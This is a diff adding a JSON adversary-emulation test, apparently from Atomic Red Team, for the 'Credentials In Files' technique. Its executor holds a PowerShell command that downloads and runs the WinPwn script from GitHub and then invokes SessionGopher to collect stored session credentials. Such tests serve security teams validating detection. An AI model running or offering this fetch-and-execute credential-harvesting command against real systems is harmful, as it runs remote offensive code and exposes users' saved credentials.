@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - SessionGopher",
+    "description": "Launches SessionGopher on this system via WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1552.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials In Files",
+    "source": "ART",
+    "uuid": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
